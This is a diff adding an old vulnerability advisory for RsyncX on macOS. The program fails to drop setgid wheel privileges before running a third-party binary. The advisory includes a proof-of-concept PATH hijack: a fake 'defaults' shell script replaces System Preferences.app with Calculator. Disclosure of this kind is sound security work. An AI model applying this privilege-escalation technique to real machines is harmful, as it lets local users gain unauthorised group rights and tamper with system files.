@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/11211/info
+
+It is reported that RsyncX is prone to a local privilege escalation vulnerability.
+
+RsyncX is installed setuid root and setgid wheel. It is reported that RsyncX drops root privileges properly but fails to drop setgid wheel privileges before executing a third party binary. 
+
+A local attacker may exploit this vulnerability to execute arbitrary code with group wheel privileges.
+
+The following example is available:
+
+First, make a backup of System\ Preferences.app
+
+Create an executable file ~/bin/defaults with contents of:
+
+=============================
+#!/bin/sh
+mv "/Applications/System Preferences.app/Contents" "/Applications/System Preferences.app/oldcont"
+cp -r "/Applications/Calculator.app/Contents" "/Applications/System Preferences.app/Contents"
+=============================
+
+Then run RsyncX with ~/bin in your path:
+
+PATH=~/bin:$PATH /Applications/Utilities/RsyncX.app/Contents/MacOS/RsyncX
+
+Click on System Preferences, and is now a calculator.
